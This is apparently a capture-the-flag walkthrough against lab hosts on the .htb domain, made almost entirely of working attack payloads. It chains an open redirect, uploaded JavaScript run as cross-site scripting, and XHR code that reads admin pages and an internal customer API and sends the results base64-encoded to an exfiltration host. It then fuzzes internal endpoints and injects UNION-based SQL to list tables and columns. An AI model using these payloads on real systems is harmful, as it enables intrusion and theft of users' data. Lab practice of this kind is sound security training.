1)Promote to Moderator (Deliver via **/deliver** option)
```
<script>
document.location = "http://vulnerablesite.htb/index.php?next=/users.php%3Fuserid=3";
</script>
```

2)Upload a JS file from **/file.php** as **application/javascript**
```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:31052/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

3)//Read the /admin.php as XSS by adding a /task.php
```
<script src="http://vulnerablesite.htb:51717/display_file.php?file_id=1"></script>
```

4)Upload a JS file from **/file.php** as **application/javascript**
```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/js/api.js', false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:31052/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

5)//Read the js/api.js as XSS by adding a /task.php
```
<script src="http://vulnerablesite.htb:31052/display_file.php?file_id=2"></script>
```

6)Reading internal api http://api.vulnerablesite.htb/v1/customers
```
<script src="http://vulnerablesite.htb:32802/display_file.php?file_id=5"></script>
```
and
```
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/customers', false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:32802/customers?r=" + btoa(xhr.responseText), false);
exfil.send();
```

6)Fuzz for other endpoints
```
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `http://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "hhttp://exfiltrate.htb:32802/fuzzing?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}

and <script src="http://vulnerablesite.htb:32802/display_file.php?file_id=6"></script>
```

7)Use this code as SQLi template
```
var xhr = new XMLHttpRequest();
var sqli = "' union select NULL,NULL,username from users-- -";
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/customer/'+sqli, false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:39508/users?r=" + btoa(xhr.responseText), false);
exfil.send();
```

8)And then fill it towards your need (we know from querying /customers that the table had ID,Name,Address so we can most likely deduct that the union should be 3 columns. We can guess the back-end **/customer** uses something like **
```
select Address,Name from customers where id='%id%'** 
```
Knowing this we know our payload show have a ' for closing the id, executing a UNION SELECT that matches 3 columns and it should return the values into
```
var xhr = new XMLHttpRequest();
var sqli = "' union select 1,2,@@version-- -";
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/customer/'+sqli, false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:30211/sql?r=" + btoa(xhr.responseText), false);
exfil.send();
```

9)We can identify all the tables in the DB
```
var xhr = new XMLHttpRequest();
var sqli = "' union select 1,2,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables-- -";
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/customer/'+sqli, false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:30211/sql?r=" + btoa(xhr.responseText), false);
exfil.send();

```
10)Get the secret data columns
```
var xhr = new XMLHttpRequest();
var sqli = "' union select NULL,NULL,gRoUp_cOncaT(column_name) fRoM information_schema.columns where table_name='secretdata'-- -";
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/customer/'+sqli, false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb:42371/sicuro?r=" + btoa(xhr.responseText), false);
exfil.send();
```
